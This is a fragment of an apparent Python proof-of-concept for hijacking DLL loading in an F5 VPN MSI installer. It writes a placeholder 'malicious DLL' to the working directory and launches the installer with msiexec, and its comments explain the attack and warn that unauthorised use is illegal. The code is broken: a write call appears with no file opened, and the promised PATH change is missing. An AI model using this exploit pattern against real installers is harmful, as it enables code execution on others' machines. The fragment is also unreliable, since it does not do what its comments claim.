# Write the malicious DLL to the current working directory

    f.write(b"\x00\x00\x00")  # Replace with your actual DLL content

# Set the PATH environment variable to include the current working directory

os.system("msiexec /i F5VPN.msi")

# This PoC assumes that the attacker has write access to the current working directory and can place the malicious DLL there. The PoC then adds the current working directory to the PATH environment variable, which causes the installer to load the malicious DLL instead of the legitimate one.

# It's worth noting that the PoC may need to be modified based on the specifics of the vulnerability and the target system. Also, running the PoC on a system without proper authorization is illegal and could result in serious consequences.
